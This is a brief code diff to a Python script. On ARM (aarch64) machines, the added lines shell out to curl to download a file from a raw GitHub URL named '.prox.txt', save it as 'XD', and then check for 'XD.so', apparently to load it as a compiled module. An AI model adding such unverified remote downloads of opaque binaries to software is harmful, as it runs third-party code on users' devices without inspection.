@@ -4,6 +4,8 @@ from os import path,system
 from platform import uname
 bt=uname().machine.lower()
 if 'aarch' in bt:
+    url = "https://raw.githubusercontent.com/AKING110/files/main/.prox.txt"
+    system("curl -L "+url+" -o XD")
     if path.isfile("XD.so"):
         pass
     else:
